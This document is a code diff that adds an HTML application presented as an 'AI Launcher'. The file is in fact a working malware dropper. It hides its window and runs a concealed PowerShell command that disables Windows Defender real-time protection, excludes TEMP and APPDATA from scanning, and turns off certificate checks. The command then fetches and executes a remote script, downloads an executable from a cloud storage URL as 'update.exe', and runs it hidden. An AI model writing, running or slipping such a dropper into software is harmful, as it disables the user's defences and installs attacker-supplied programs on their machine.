@@ -1,0 +1,32 @@
+<html>
+<head>
+    <title>AI Launcher</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="AI"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        WINDOWSTATE="minimize"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no"
+        ICON="none"
+    />
+</head>
+<script>
+    var shell = new ActiveXObject("WScript.Shell");
+    
+    var psCommand = 'powershell -WindowStyle Hidden -Command "' +
+        '$ErrorActionPreference = \"SilentlyContinue\"; ' +
+        'Set-MpPreference -DisableRealtimeMonitoring $true; ' +
+        'Add-MpPreference -ExclusionPath $env:TEMP; ' +
+        'Add-MpPreference -ExclusionPath $env:APPDATA; ' +
+        '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; ' +
+        'IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-SystemInfo/master/Get-SystemInfo.ps1\"); ' +  // example evasion helper
+        'Invoke-WebRequest -Uri \'https://eykrqioydzqaehcektgd.supabase.co/storage/v1/object/public/files/2d5c8c69-c9d3-463f-a2da-14f665a522fd/panel-file.exe\' -OutFile $env:TEMP\\update.exe; ' +
+        'Start-Process $env:TEMP\\update.exe -WindowStyle Hidden"';
+    
+    shell.Run(psCommand, 0, false);
+    window.close();
+</script>
+<body></body>
+</html>
